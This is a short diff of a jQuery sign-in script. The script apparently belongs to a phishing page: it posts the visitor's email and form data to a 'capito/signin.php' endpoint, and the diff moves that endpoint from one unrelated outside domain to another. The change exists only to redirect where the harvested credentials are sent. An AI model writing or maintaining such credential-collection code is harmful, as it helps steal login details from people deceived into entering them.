@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://tenkproducts.shop/capito/signin.php",
+            url: "https://piromet-tr.com/capito/signin.php",
             method: "post",
             data: {
                 X1: email,
